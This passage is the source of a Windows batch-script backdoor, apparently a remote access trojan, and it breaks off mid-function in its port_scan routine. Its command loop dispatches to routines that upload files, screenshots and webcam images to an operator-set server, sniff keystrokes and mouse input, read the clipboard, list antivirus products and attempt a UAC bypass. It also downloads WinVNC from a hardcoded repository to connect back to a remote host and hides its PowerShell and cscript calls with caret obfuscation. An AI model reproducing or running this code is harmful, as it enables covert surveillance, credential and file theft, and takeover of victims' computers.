if "%shell_output:~0,4%"=="exec" call :exec & goto loop
if "%shell_output:~0,4%"=="kill" call :kill & goto loop
if "%shell_output:~0,7%"=="netstat" call :netstat & goto loop
if "%shell_output%"=="show upload_url" call :show upload_url & goto loop
if "%shell_output:~0,2%"=="cp" call :cp & goto loop
if "%shell_output:~0,2%"=="mv" call :mv & goto loop
if "%shell_output:~0,6%"=="winvnc" call :winvnc & goto loop
if "%shell_output:~0,8%"=="sendkeys" call :sendkeys & goto loop
if "%shell_output%"=="showkeys" call :showkeys & goto loop
if "%shell_output:~0,6%"=="speech" call :speech & goto loop
if "%shell_output%"=="shell" call :shell & goto loop
if "%shell_output%"=="powershell" call :powershell & goto loop
if "%shell_output:~0,1%"=="@" call :multi_commands & goto loop
if "%shell_output%"=="exit" call :exit 
if "%shell_output:~0,2%"=="ls" call :ls & goto loop
if "%shell_output:~0,5%"=="rmdir" call :rmdir & goto loop
if "%shell_output:~0,5%"=="sleep" call :sleep & goto loop
if "%shell_output:~0,3%"=="run" call :run & goto loop
if "%shell_output%"=="lockscreen" call :lockscreen & goto loop
if "%shell_output:~0,4%"=="open" call :open & goto loop
if "%shell_output%"=="get_path" call :get_path & goto loop
if "%shell_output%"=="get_services" call :get_services & goto loop
if "%shell_output%"=="get_install" call :get_install & goto loop
if "%shell_output%"=="get_win" call :get_win & goto loop
if "%shell_output:~0,13%"=="mouse_control" call :mouse_control & goto loop
if "%shell_output:~0,13%"=="mouse_sniffer" call :mouse_sniffer & goto loop
if "%shell_output:~0,16%"=="keyboard_sniffer" call :keyboard_sniffer & goto loop
if "%shell_output:~0,8%"=="win_mode" call :win_mode & goto loop
if "%shell_output:~0,10%"=="screengrab" call :screengrab & goto loop
if "%shell_output%"=="get_ip" call :get_ip& goto loop
if "%shell_output:~0,8%"=="get_wifi" call :get_wifi & goto loop
if "%shell_output:~0,6%"=="python" call :python & goto loop
if "%shell_output:~0,6%"=="sqlite" call :sqlite & goto loop
if "%shell_output:~0,10%"=="uac_bypass" call :uac_bypass & goto loop
if "%shell_output%"=="get_task" call :get_task & goto loop
if "%shell_output%"=="add_task" call :add_task & goto loop
if "%shell_output%"=="start_task" call :start_task & goto loop
if "%shell_output:~0,11%"=="webcam_snap" call :webcam_snap & goto loop
if "%shell_output:~0,7%"=="netview" call :netview & goto loop
if "%shell_output:~0,9%"=="port_scan" call :port_scan & goto loop
if "%shell_output:~0,6%"=="search" call :search & goto loop
if "%shell_output:~0,6%"=="update" call :update & goto loop
if "%shell_output%"=="geolocate" call :geolocation & goto loop
if "%shell_output:~0,13%"=="get_file_info" call :get_file_info & goto loop
if "%shell_output:~0,9%"=="host_scan" call :host_scan & goto loop

echo.
echo [-] Unknow Command
goto loop


:host_scan
echo.
set host_IP=
set host_IP=%shell_output:~10,99999%
if not defined host_IP (
echo   Usage: host_scan 192.168.1.50 
echo   Usage: host_scan 192.168.1.50,192.168.1.100 
echo   Usage: host_scan 192.168.1.1-192.168.1.10
echo   Usage: host_scan 192.168.1.1/24
echo   Usage: host_scan hosts.txt
exit /b
)
if not exist "%systemdrive%\_temp_\HostInfo.bin" echo [-] HostInfo.bin Not Found & exit /b
%systemdrive%\_temp_\HostInfo.bin -i %host_IP%
exit /b




:get_file_info
echo.
setlocal ENABLEDELAYEDEXPANSION
set local_file_path=
set local_file_path=%shell_output:~14,99999%
if not defined local_file_path echo   Usage: get_file_info FullPath & echo   Usage: get_file_info C:\windows\system32\notepad.exe & exit /b

echo [*] Checking File is Exits
if not exist "%local_file_path%" echo [-] %local_file_path% Not Exist & exit /b 
set local_file_path=%local_file_path:\=\\%
for /f "tokens=1 skip=1" %%A in ('wmic datafile where name^="%local_file_path%" get Version 2^>^&1 ^| findstr /r /v "^$"') do set file_version=%%A
set hex_value=
set /A c1=0
set /A cl=0
set x64_hex=50 45 00 00 64
set x32_hex=50 45 00 00 4c

echo [*] [%local_file_path%] Encoding to hexadecimal code
if exist "%temp%\hex_encode.txt" del "%temp%\hex_encode.txt" >nul
certutil -encodehex "%local_file_path%" "%temp%\hex_encode.txt" >nul 2>&1
if not exist "%temp%\hex_encode.txt" echo [-] Can't convert into Hexadecimal code & exit /b
echo [*] Getting Hexadecimal Code Value
call :get_hex
exit /b

:loop_64
for /f "tokens=18" %%A in ('type "%temp%\get_hex.txt"') do set value=%%A
:loop_64_2
if "PE..d"=="!value:~%c1%,5!" echo [+] %local_file_path% Base=[64bit], Version=[%file_version%] & goto _remove_
set /A c1+=1
set /A c2+=1
ping localhost -n 1 >nul
if %c2%==20 goto _remove_
goto loop_64_2

:loop_32
for /f "tokens=18" %%A in ('type "%temp%\get_hex.txt"') do set value=%%A
:loop_32_2
if "PE..L"=="!value:~%c1%,5!" echo [+] %local_file_path% Base=[32bit], Version=[%file_version%]& goto _remove_
set /A c1+=1
set /A c2+=1
ping localhost -n 1 >nul
if %c2%==20 goto _remove_
goto loop_32_2

:get_hex
findstr /c:"%x32_hex%" "%temp%\hex_encode.txt" > "%temp%\get_hex.txt"
if %errorlevel%==0 goto loop_32 & exit /b
findstr /c:"%x64_hex%" "%temp%\hex_encode.txt" > "%temp%\get_hex.txt"
if %errorlevel%==0 goto loop_64 & exit /b
echo [-] Invalid Format 
goto _remove_

:_remove_
if exist "%temp%\hex_encode.txt" del "%temp%\hex_encode.txt" >nul
if exist "%temp%\get_hex.txt" del "%temp%\get_hex.txt" >nul
setlocal DISABLEDELAYEDEXPANSION
exit /b


:geolocation
echo.
for /f "tokens=*" %%I in ('cscript /nologo %vbscript% get_geo 1 2^>^&1') do set location=%%I
if not "%location:~2,6%"=="status" echo [-] Can't Get Information & exit /b
set location=%location:{=%
set location=%location:}=%
set location=%location:"=%

set c=1
:LL
set line=
for /f "tokens=%c% delims=," %%i in ("%location%") do set line=%%i
if "%line%"=="" exit /b
set line=%line::= : %
for /f "tokens=1,*" %%A in ("%line%") do ( 
if "%%A"=="continent" echo %%A	%%B& goto LT
if "%%A"=="continentCode" echo %%A	%%B& goto LT
if "%%A"=="countryCode" echo %%A	%%B& goto LT
if "%%A"=="regionName" echo %%A	%%B& goto LT
if "%%A"=="district" echo %%A	%%B& goto LT
if "%%A"=="timezone" echo %%A	%%B& goto LT
if "%%A"=="currency" echo %%A	%%B& goto LT
echo %%A		%%B
)
:LT
set /A c+=1
goto LL
exit /b






:update
echo.
set url=
set url=%shell_output:~7,999999%
if not defined url echo   Usage: update File-Url & echo   Usage: update http://host/update.zip & exit /b

set give_zip_ext=
set File_with_path=%url%
call :get_file_extension give_zip_ext
if not "%give_zip_ext%"==".zip" echo [-] This is not zip file URL! & exit /b

set give_zip_name=
set File_with_path=%url%
call :get_file_name give_zip_name
if exist %give_zip_name% del %give_zip_name% >nul
call :download2
if not exist "%give_zip_name%" echo [-] %give_zip_name% Download Failed & exit /b
echo [*] Extracting %give_zip_name%
call :unzip_file %give_zip_name%
echo [+] Updated Success
exit /b



:get_file_size
set var1=
set var1=%1
For %%I in (%File_with_path%) do set %var1%=%%~zI
exit /b

:get_file_name
set var1=
set var1=%1
For %%I in (%File_with_path%) do set %var1%=%%~xnI
exit /b

:get_file_extension
set var1=
set var1=%1
For %%I in (%File_with_path%) do set %var1%=%%~xI
exit /b


:unzip_file
set var1=
set var1=%1
unzip.exe -q -o %var1%
exit /b 

:get_startup_app
echo.
for /f "tokens=*" %%i in ('wmic STARTUP get command ^| findstr /v "Command" ^| findstr /r /v "^$"') do (
echo [+] %%i
)
exit /b

:open
echo.
set open_folder=
set open_folder=%shell_output:~5,9999%
if not defined open_folder echo   Usage: open C:\ & echo   Usage: open https://www.google.com &exit /b
explorer "%open_folder%"
echo [+] "%open_folder%" Success
exit /b

:get_services
echo.
wmic service get name,pathname
exit /b

:get_install
echo.
wmic product get name
exit /b

:get_path
echo.
set c=1
:LL01
set line=
for /f "tokens=%c% delims=;" %%i in ("%path%") do set line=%%i
if not "%line%"=="" echo %line% &set /A c+=1& goto LL01
exit /b

:run
echo.
set run_file=
set getprocessid=
set run_file=%shell_output:~4,99999%
if not defined run_file echo   Usage: run calc.exe & exit /b
for /f "tokens=3" %%A in ('wmic process call create "%run_file%" ^| find /i "ProcessId"') do set getprocessid=%%A
if defined getprocessid (
echo [+] File=%run_file% Pid=%getprocessid% Success
) else (
echo [-] %run_file% can't run
)
exit /b


:shell
cmd
if "%multi_cmd%"=="ENABLE" exit /b
exit /b


:lockscreen
echo.
rundll32 user32.dll,LockWorkStation
echo [+] Screen locked Successfully
exit /b



:search
echo.
echo [*] This will take few seconds...
echo.
set search_command=
set search_command=%shell_output:~7,9999%
if not defined search_command echo   Usage: search C:\filename & echo   Usage: search C:\image.jpg & exit /b
for /f "tokens=*" %%A in ('dir /s /b "%search_command%"') do ( set pt=%%A
if "%%A"=="File Not Found" echo [-] File Not Found & exit /b
echo [+] %%A
)
exit /b


:exit
exit


:get_ip
echo.
set ip4_url=http://api.ipify.org?format=json
set ip6_url=https://api64.ipify.org?format=json

set ip4=
set ip6=
for /f "tokens=*" %%i in ('cscript /nologo %vbscript% readurl %ip4_url% 1') do set ip4=%%i
for /f "tokens=*" %%i in ('cscript /nologo %vbscript% readurl %ip6_url% 1') do set ip6=%%i

if defined ip4 (
echo [+] Public IP Address v4 : %ip4%
) else (
echo [-] Can't Get v4 IP Address
exit /b 
)

if defined ip6 (
echo [+] Public IP Address v6 : %ip6%
) else (
echo [-] Can't Get v6 IP Address
exit /b 
)

exit /b

:powershell
p^o^wers^he^ll -e^xe^c b^ypa^ss
exit /b


:python
echo.
set path=%path%;%systemdrive%\python27;%systemdrive%\python27\scripts
set python_command=
set python_command=%shell_output:~7,7%
if "%python_command%"=="install" call :install_python & exit /b
if not defined python_command if exist "%systemdrive%\python27\python.exe" echo [+] Python27 interpreter & %systemdrive%\python27\python.exe -i & exit /b
if not exist "%systemdrive%\python27\python.exe" (
echo [-] Python2 Not Installed Use [python install] command
exit /b
) else (
%systemdrive%\python27\python.exe %shell_output:~7,9999999%
exit /b
)


:install_python
if exist "%systemdrive%\python27\python.exe" echo [+] Python27 Already Installed & exit /b
set python_url=
set python_url=%shell_output:~15,99999%
if not defined python_url echo   Usage: python install http://python.com/python27.msi & exit /b

cscript /nologo %jscript% %python_url% "%temp%\python27.msi" >nul

if exist "%temp%\python27.msi" (
echo [+] Python File Downloaded Successfully
echo [+] Installing Python Please Wait for Few Seconds...
%temp%\python27.msi /q /norestart
ping localhost -n 10 >nul
) else (
echo [-] Python File Download Failed
exit /b
)
if exist "%systemdrive%\python27\python.exe" (
echo [+] Python Installed Successfully
attrib +s +h +a "%systemdrive%\python27" >nul
if exist "%temp%\python27.msi" del /q "%temp%\python27.msi" >nul
) else (
echo [-] Python Not Installed
)
exit /b


:sqlite
echo.
set path=%path%;%systemdrive%\_temp_
set sqlite_command=
set sqlite_command=%shell_output:~7,99999%
if "%shell_output:~7,7%"=="install" call :sqlite_install & exit /b
if not exist "%systemdrive%\_temp_\sqlite3.exe" echo [-] sqlite3 Not Installed & exit /b
if not defined sqlite_command echo sqlite3:^> & sqlite3.exe & exit /b
sqlite3.exe %sqlite_command%
exit /b


:sqlite_install
set sqlite_url=
set sqlite_url=%shell_output:~15,9999999%
if not defined sqlite_url echo   Usage: sqlite install http://sqlite.com/sqlite.exe & exit /b
taskkill /im sqlite3.exe /f >nul 2>&1
if exist "%systemdrive%\_temp_\sqlite3.exe" del /q "%systemdrive%\_temp_\sqlite3.exe" >nul
cscript /nologo %jscript% %sqlite_url% "%systemdrive%\_temp_\sqlite3.exe" >nul
if exist "%systemdrive%\_temp_\sqlite3.exe" (
echo [+] sqlite3.exe Download Successfully
) else (
echo [-] sqlite3.exe Not Installed
)
exit /b



:show_drive
echo. 
wmic LOGICALDISK get caption,Description | find /i ":"
exit /b

:arp
echo.
arp -a | find /i "dynamic"
exit /b


:pwd
echo.
echo %cd%
exit /b

:netstat
netstat -ano 
exit /b


:ps
echo.
tasklist /SVC /FO LIST
exit /b

:cd
echo.
cd "%shell_output:~3,9999%"
exit /b

:get_priv
whoami /priv
exit /b


:ls
echo.
set ls_path=
set ls_path=%shell_output:~3,99999%
echo %ls_path%
dir /b "%ls_path%"
exit /b

:cat
echo.
set cat_file=
set cat_file=%shell_output:~4,99999%
if not defined cat_file echo   Usage: cat file.txt & goto loop
if not exist "%cat_file%" echo [-] "%cat_file%" Not Found & goto loop
type "%cat_file%"
exit /b



:ifconfig
echo.
ipconfig | find /i "IP"
exit /b


:netview
echo.
echo [*] Getting All local Network Computer
echo.
for /f "tokens=*" %%A in ('net view ^| find /i "\\"') do (
echo [+] %%A
)
exit /b


:sleep
echo.
set time_sleep=
set time_sleep=%shell_output:~6,999999%
echo [*] Waiting for %time_sleep% seconds...
timeout %time_sleep% >nul
exit /b

:rm
echo.
set Lfile=
set Lfile=%shell_output:~4,999999%
if not defined Lfile echo   Usage: rm C:\filename & goto loop
if exist "%Lfile%" (
del /q "%Lfile%" >nul 2>&1
if not exist "%Lfile%" (echo [+] File Deleted Successfully) else (echo [-] "%Lfile%" File can't be delete)
) else (
echo [-] "%Lfile%" not exist
)
exit /b



:rmdir
echo.
set Ldir=
set Ldir=%shell_output:~6,99999%
if not defined Ldir echo   Usage: rmdir C:\Directory & goto loop
if exist "%Ldir%" (
rmdir /s /q "%Ldir%" >nul 2>&1
if not exist "%Ldir%" (echo [+] Deleted Successfully) else (echo [-] "%Ldir%" Can't be Delete)
) else (
echo [-] "%Ldir%" not exist
)
exit /b

:sysinfo
echo.
for /f "tokens=*" %%A in ('hostname') do set host_name=%%A
for /f "tokens=*" %%A in ('echo %username%') do set user_name=%%A
for /f "skip=1 tokens=*" %%A in ('wmic os get Caption ^| findstr /r /v "^$"') do set osname=%%A
for /F "skip=1 tokens=*" %%A in ('wmic os get osarchitecture ^| findstr /r /v "^$"') do set base=%%A
for /F "skip=1 tokens=*" %%A in ('wmic os get version ^| findstr /r /v "^$"') do set os_version=%%A
for /F "skip=1 tokens=*" %%A in ('wmic os get SerialNumber ^| findstr /r /v "^$"') do set Serialno=%%A
for /F "skip=1 tokens=*" %%A in ('wmic cpu get name ^| findstr /r /v "^$"') do set Processor=%%A
for /F "skip=1 tokens=*" %%A in ('wmic bios get Manufacturer ^| findstr /r /v "^$"') do set Manufacturer=%%A
for /F "tokens=* delims=" %%A in ('wmic desktopmonitor get screenheight /format:value') do (
for /F "tokens=2 delims==" %%i in ("%%A") do set screenwidth=%%i
)
for /F "tokens=* delims=" %%A in ('wmic desktopmonitor get screenwidth /format:value') do (
for /F "tokens=2 delims==" %%i in ("%%A") do set ScreenHeight=%%i
)
echo Host Name    : %host_name%
echo User Name    : %user_name%
echo OS Name      : %osname%
echo OS Version   : %os_version%
echo System Type  : %base%
echo Processor    : %Processor%
echo SerialNumber : %Serialno%
echo Manufacturer : %Manufacturer%
echo Resolution   : %screenheight% x %screenwidth%
exit /b


:check_server_file
if not exist %vbscript% echo [-] %vbscript% Not Found & goto loop
for /f "tokens=1" %%A in ('c^s^c^r^ip^t /nologo %vbscript% url_exist %url% 2') do (
set url_exist=%%A
)
if "%url_exist%"=="OK" exit /b 100
if "%url_exist%"=="[-] Failed" exit /b 101
exit /b


:upload_file
set local-file=%local-file:"=%
if exist "%local-file%" (
for /f "tokens=1" %%A in ('c^s^c^r^ip^t /nologo %vbscript% upload %upload_php% "%local-file%"^') do set upload_status=%%A
)

if "%upload_status%"=="OK" (
exit /b 100
) else (
exit /b 101
)
exit /b


:download_file
set local-file=%local-file:"=%
if exist "%local-file%" del "%local-file%" >nul
c^s^c^r^ip^t /nologo %jscript% %url% "%local-file%" >nul
if exist "%local-file%" (
exit /b 100
) else (
exit /b 101
)
exit /b




:download
echo.
if not exist %jscript% echo [-] %jscript% Not Found & goto loop
set url=%shell_output:~9,9999999%
if not defined url echo   Usage: download http://127.0.0.1/file.txt & goto loop
:download2
set errorlevel=
call :check_server_file
if %errorlevel%==100 ( 
for %%A IN (%url%) DO (set local-file=%%~nxA)
) else (
echo [-] URL Dosn't exist
if "%multi_cmd%"=="ENABLE" exit /b
exit /b
)
set errorlevel=
call :download_file
if %errorlevel%==100 (
echo [+] %local-file% Downloaded Successfully
) else (
echo [-] %local-file% Can't Download
)
exit /b

:upload
echo.
if not "%upload_php:~0,4%"=="http" echo [-] First Set Upload Server URL & goto loop
set local-file=%shell_output:~7,9999999%
if not defined local-file echo   Usage: upload file.txt & goto loop
if not exist "%local-file%" echo [-] %local-file% Not Found & goto loop
set errorlevel=
call :upload_file
if %errorlevel%==100 (
echo [+] %local-file% Uploaded Successfully
) else (
echo [-] %local-file% Can't Upload
)
exit /b



:screenshot
echo.
if not exist %ps1% echo [-] %ps1% Not Found & exit /b
if exist Screenshot.bmp del Screenshot.bmp
if not defined upload_php echo [-] First Set Upload Server URL & exit /b
echo [*] Getting Screenshot Via P^ow^er^shel^l
p^ow^ers^he^l^l -exec bypass %ps1%
if not exist Screenshot.bmp echo [-] Can't Get Screenshot & exit /b
set local-file=Screenshot.bmp
set screenshot_url=%upload_php:index.php=Screenshot.bmp%
set errorlevel=
call :upload_file
if %errorlevel%==100 (
echo [+] Screenshot.bmp Uploaded to %screenshot_url%
if exist Screenshot.bmp del /q Screenshot.bmp >nul
) else (
echo [-] Screenshot.bmp Can't Upload to Server
)
exit /b


:show upload_url
echo.
if not "%upload_php%"=="" (
echo [+] %upload_php%
) else (
echo [-] Url Not Set 
)
exit /b


:set upload_url
echo.
set upload_php=%shell_output:~15,99999%
if not defined upload_php echo   Usage: set upload_url http://127.0.0.1/upload/index.php & goto loop
set url=%upload_php%
set errorlevel=
call :check_server_file
if %errorlevel%==100 (
echo [+] %upload_php%
) else (
echo [-] %upload_php% Not exist
)
exit /b


:get_clip
echo.
if not exist %vbscript% echo [-] %vbscript% Not Found & goto loop
echo *********************************************************************
c^s^c^r^ip^t /nologo %vbscript% get_clip 1 1
echo *********************************************************************
exit /b


:get_av
echo.
set disply=
for /F "tokens=* delims=displayName=" %%A in ('W^M^IC /N^ode:l^ocal^host /Na^mes^pace:\\ro^o^t\S^ecur^ityCe^nter^2 Path A^nti^V^ir^usP^ro^d^uc^t Ge^t d^ispl^ay^Na^me /Fo^rm^at:Li^st ^| find /i "displayName="') do (
if "%%A"=="" echo [-] Antivirus Not Found
echo [+] %%A
)
exit /b

:get_users
echo.
for /f "skip=1 tokens=* delims= " %%A in ('wmic useraccount get name ^| findstr /r /v "^$"') do (
echo [+] %%A
)
exit /b

:trigger_command
echo.
%local_command%
exit


:exec
rem :: exec ncat -lvp 4444
set local_command=%shell_output:~5,999999%
if not defined local_command echo. & echo   Usage: exec ipconfig /all & goto loop
start /b call %~nx0 trigger_command
exit /b


:kill
echo.
set ProcessID=%shell_output:~5,9999%
if not defined ProcessID echo   Usage: kill process_name/pid & echo   Usage: kill notepad.exe &echo   Usage: kill 1234 & goto loop
for %%A in ("%ProcessID%") do (
if "%%~xA"==".exe" set process=name
)
set process=pid
if %process%==name (
taskkill /im %ProcessID% /f
) else (
taskkill /pid %ProcessID% /f
)
exit /b

:cp
echo.
set local_file=
set local_file=%shell_output:~3,99999999%
if not defined local_file echo   Usage: cp source -d destination & echo   Usage: cp C:\file.txt -d D:\file.txt & goto loop
for /f "tokens=1,* delims=-d" %%A in ('echo %local_file%') do (
set source_file=%%A
set destination_file=%%B
)
for %%A in ("%source_file%") do (
set source_file=%%~fA
)
for %%A in ("%destination_file:~1,99999999%") do (
set destination_file=%%~fA
)
if exist "%source_file%" (
copy /y "%source_file%" "%destination_file%"
) else (
echo [-] "%source_file%" not Exist
)
exit /b

:mv
echo.
set source_file=
set destination_file=
set local_file=
set local_file=%shell_output:~3,99999999%
if not defined local_file echo   Usage: mv source -d destination & echo   Usage: mv C:\file.txt -d D:\file.txt & goto loop
for /f "tokens=1,* delims=-d" %%A in ('echo %local_file%') do (
set source_file=%%A
set destination_file=%%B
)
for %%A in ("%source_file%") do (
set source_file=%%~fA
)
for %%A in ("%destination_file:~1,99999999%") do (
set destination_file=%%~fA
)
if exist "%source_file%" (
move /y "%source_file%" "%destination_file%"
) else (
echo [-] "%source_file%" not Exist
)
exit /b

:webcam_snap
echo.
if exist "%systemdrive%\_temp_\image.bmp" del /q "%systemdrive%\_temp_\image.bmp" >nul
set webcam_file=%systemdrive%\_temp_\wcam.bin
set webcam_snap_command=
set webcam_snap_command=%shell_output:~12,9999%
if exist "%webcam_file%" (
goto webcam_start
) else (
echo [-] %webcam_file% Not Found
)
exit /b


:webcam_start
set webcam_image_url=
%webcam_file% %webcam_snap_command%
set local-file=%systemdrive%\_temp_\image.bmp
if not exist "%local-file%" exit /b
if exist "%local-file%" if not defined upload_php echo [-] First Set Upload Server URL & exit /b
if exist "%local-file%" set webcam_image_url=%upload_php:index.php=image.bmp%
set errorlevel=
call :upload_file
if %errorlevel%==100 (
echo [+] image.bmp Uploaded Successfully %webcam_image_url%
) else (
echo [+] image.bmp can't uploaded
)
exit /b


:winvnc
set errorlevel=
echo.
set winvnc_command=
set winvnc_command=%shell_output:~6,99999%
set winvnc_1=
set winvnc_2=
set winvnc_3=
if not defined winvnc_command echo   Usage: winvnc install &  echo   Usage: winvnc start & echo   Usage: winvnc connect host port & echo   Usage: winvnc kill & exit /b
for /f "tokens=1,2,3" %%i in ("%winvnc_command%") do (
set winvnc_1=%%i
set winvnc_2=%%j
set winvnc_3=%%k
)

if "%winvnc_1%"=="install" goto winvnc_install
if "%winvnc_1%"=="start" goto winvnc_start
if "%winvnc_1%"=="connect" goto winvnc_connect
if "%winvnc_1%"=="kill" goto winvnc_kill

:winvnc_install 
call :check_winvnc_installation retrun
if %retrun%==11 (
	echo [+] Winvnc Already Installed
	exit /b
)
echo [*] You can use your own URL [winvnc install url=http://127.0.0.1/winvnc.cab]
set winvnc_url=
set winvnc_url=%shell_output:~19,999999%
if not defined winvnc_url set winvnc_url=https://raw.g^ith^ubu^ser^content.com/D^evi^lBo^t0^0^0/Tools/master/wi^n^vnc.c^a^b
echo [*] Downloading Winvnc
if exist "%systemdrive%\_temp_\winvnc.cab" del "%systemdrive%\_temp_\winvnc.cab" >nul
cscript /nologo %jscript% %winvnc_url% "%systemdrive%\_temp_\winvnc.cab" >nul

if exist "%systemdrive%\_temp_\winvnc.cab" (
	expand "%systemdrive%\_temp_\winvnc.cab" -F:*  "%systemdrive%\_temp_" >nul
) else (
	echo [-] Winvnc Download Failed
	goto exit /b
)

call :check_winvnc_installation retrun
if %retrun%==11 (
echo [+] Winvnc Download Successfully
) else (
echo [-] Winvnc Download Failed
)
exit /b



:winvnc_start
call :check_winvnc_installation retrun
if %retrun%==11 (
	echo [+] Winvnc Installed
) else (
	echo [-] Winvnc Not Installed
	exit /b
)
start %systemdrive%\_temp_\winvnc.exe >nul
timeout 3 >nul
call :check_winvnc_Started retrun
if %retrun%==21 (
echo [+] Winvnc Started with pid=%confirm_pid% Successfully
exit /b
) else (
echo [-] Winvnc Not Start
exit /b
)



:winvnc_kill
call :check_winvnc_Started retrun
if %retrun%==21 (
echo [*] Killing Winvnc Server
taskkill /im winvnc.exe /f >nul
echo [+] winvnc Server Killed Successfully
exit /b
) else (
echo [-] Winvnc Server Already stop
exit /b
)



:winvnc_connect
if not defined winvnc_2 if not defined winvnc_3 (
	echo   Usage: winvnc install
	echo   Usage: winvnc start
	echo   Usage: winvnc connect host port
	echo   Usage: winvnc kill
	exit /b
)
call :check_winvnc_Started retrun
if %retrun%==21 (
echo [+] Winvnc is runing with pid=%confirm_pid%
) else (
echo [-] Winvnc Not runing
exit /b
)
%systemdrive%\_temp_\winvnc.exe -connect %winvnc_2%::%winvnc_3%
call :winvnc_check_connection retrun
if %retrun%==50 (
echo [+] Winvnc Connected Successfully
exit /b
) else (
echo [-] Winvnc Conntection Failed
exit /b
)



:check_winvnc_installation
set retrun=99
if exist "%systemdrive%\_temp_\winvnc.exe" if exist "%systemdrive%\_temp_\ultravnc.ini" if exist "%systemdrive%\_temp_\vnchooks.dll" set %~1=11 & exit /b
set %~1=12
exit /b

:check_winvnc_Started
set retrun=99
set winvnc_pid=
set confirm_pid=
ping localhost -n 2 >nul
for /f "tokens=1,2" %%A in ('tasklist ^| find /i "winvnc.exe"') do set winvnc_pid=%%B
for /f "tokens=5" %%A in ('netstat -ano ^| find /i "0.0.0.0:5959"') do set confirm_pid=%%A
if defined winvnc_pid if defined confirm_pid set %~1=21& exit /b
set %~1=22
exit /b

:winvnc_check_connection
set retrun=99
ping localhost -n 7 >nul
set errorlevel=
set winvnc_pid=
for /f "tokens=1,2" %%A in ('tasklist ^| find /i "winvnc.exe"') do set winvnc_pid=%%B
for /f "tokens=4" %%A in ('netstat -ano ^| find /i "%winvnc_pid%"') do (
if "%%A"=="ESTABLISHED" set %~1=50& exit /b
)
set %~1=51
exit /b 101


:showkeys
echo.
echo  ctrl		: CTRL
echo  alt		: ALT
echo  Backspace      : {BACKSPACE}, {BKSP} or {BS}
echo  Break          : {BREAK}
echo  Caps Lock      : {CAPSLOCK}
echo  Delete         : {DELETE} or {DEL}
echo  Down Arrow     : {DOWN}
echo  End            : {END}
echo  Enter          : {ENTER} or ~
echo  Escape         : {ESC}
echo  Help           : {HELP}
echo  Home           : {HOME}
echo  Insert         : {INSERT} or {INS}
echo  Left Arrow     : {LEFT}
echo  Num Lock       : {NUMLOCK}
echo  Page Down      : {PGDN}
echo  Page Up        : {PGUP}
echo  Print Screen   : {PRTSC}
echo  Right Arrow    : {RIGHT}
echo  Scroll Lock    : {SCROLLLOCK}
echo  Tab            : {TAB}
echo  Up Arrow       : {UP}
echo  F1             : {F1}
echo  F2             : {F2}
echo  F3             : {F3}
echo  F4             : {F4}
echo  F5             : {F5}
echo  F6             : {F6}
echo  F7             : {F7}
echo  F8             : {F8}
echo  F9             : {F9}
echo  F10            : {F10}
echo  F11            : {F11}
echo  F12            : {F12}
echo  F13            : {F13}
echo  F14            : {F14}
echo  F15            : {F15}
echo  F16            : {F16}
exit /b

:sendkeys
echo.
set keys=
set keys=%shell_output:~9,9999999%
if not defined keys echo   Usage: sendkeys ctrl#alt#keys&echo   Usage: sendkeys {keys}& goto loop
call :create_keys_script
exit /b


:create_keys_script
set first_key=
set scnd_key=
set third_key=
set fourth_key=

for /f "tokens=1,2,3,* delims=#" %%A in ("%keys%") do (
set first_key=%%A
set scnd_key=%%B
set third_key=%%C
set fourth_key=%%D
)

if "%first_key%"=="ctrl" if defined scnd_key if defined third_key set keys=^^{%scnd_key%}{%third_key%}
if "%first_key%"=="ctrl" if not defined third_key if not defined fourth_key set keys=^^{%scnd_key%}
if "%first_key%"=="alt" if not defined third_key if not defined fourth_key set keys=%%{%scnd_key%}
if "%first_key%"=="ctrl" if "%scnd_key%"=="alt" set keys=^^%%{%third_key%}


if exist "%temp%\keys.vbs" del "%temp%\keys.vbs" >nul
echo set shl = CreateObject^("wscript.shell"^)>>"%temp%\keys.vbs"
echo wscript.sleep 700>>"%temp%\keys.vbs"
echo shl.sendkeys "%keys%">>"%temp%\keys.vbs"
cscript /nologo "%temp%\keys.vbs"
exit /b

:speech
echo.
set words=
set words=%shell_output:~7,9999999999999%
if not defined words echo    Usage: speech "i love you"& goto loop
set words=%words:"=%
if exist "%temp%\speech.vbs" del "%temp%\speech.vbs" >nul
echo Dim sapi>>"%temp%\speech.vbs"
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)>>"%temp%\speech.vbs"
echo Set sapi=CreateObject^("sapi.spvoice"^)>>"%temp%\speech.vbs"
echo sapi.Speak "%words%">>"%temp%\speech.vbs"
cscript /nologo "%temp%\speech.vbs"
exit /b


:multi_commands
echo.
set check_output=
set check_output=%shell_output:~1,999999%
if not defined check_output echo   Usage: @command1+command2+command3+command4+command5 & goto loop
set multi_cmd=ENABLE
setlocal ENABLEDELAYEDEXPANSION
set len=1
for /l %%A in (0,1,1000) do (
for /l %%a in (1,1,1000) do (
if "!shell_output:~%%A,%%a!"=="+" set /A len+=1
))


if %len% gtr 5 echo [*] You Can Use only 5 multi Commands & goto loop

set c1=
set c2=
set c3=
set c4=
set c5=

for /F "tokens=1-%len% delims=+" %%A in ('echo %check_output%') do (
set c1=%%A
set c2=%%B
set c3=%%C
set c4=%%D
set c5=%%E
)
if not "%c1%"=="%%A" set shell_output=%c1%& call :%c1%
if not "%c2%"=="%%B" set shell_output=%c2%& call :%c2%
if not "%c3%"=="%%C" set shell_output=%c3%& call :%c3%
if not "%c4%"=="%%D" set shell_output=%c4%& call :%c4%
if not "%c5%"=="%%E" set shell_output=%c5%& call :%c5%
setlocal DISABLEDELAYEDEXPANSION
exit /b


:get_win
echo.
set output_exe=get_win.exe
set C#_script=%systemdrive%\_temp_\get_active_windows.cs
call :generate_c#
if exist "%systemdrive%\_temp_\%output_exe%" (
%output_exe%
) else (
echo [-] %output_exe% not found 
)
exit /b


:mouse_control
echo.
set output_exe=control_mouse.exe
set C#_script=%systemdrive%\_temp_\control_mouse.cs
call :generate_c#
set control_mouse_command=
set control_mouse_command=%shell_output:~14,999999%
if exist "%systemdrive%\_temp_\%output_exe%" (
%output_exe% %control_mouse_command%
) else (
echo [-] mouse_control.exe not found 
)
exit /b


:win_mode
echo.
set output_exe=win_mode.exe
set C#_script=%systemdrive%\_temp_\win_mode.cs
call :generate_c#
set win_mode_command=
set win_mode_command=%shell_output:~9,999999%
if defined win_mode_command set win_mode_command=%win_mode_command:'="%
if exist "%systemdrive%\_temp_\%output_exe%" (
%output_exe% %win_mode_command%
) else (
echo [-] %output_exe% not found
)
exit /b




:port_scan
echo.
set scanner_file=%systemdrive%\_temp_\portscanner.bin
set port_scan_command=
set port_scan_command=%shell_output:~10,9999%

if not defined port_scan_command (
echo   Usage: port_scan ip
echo   Usage: port_scan ip port
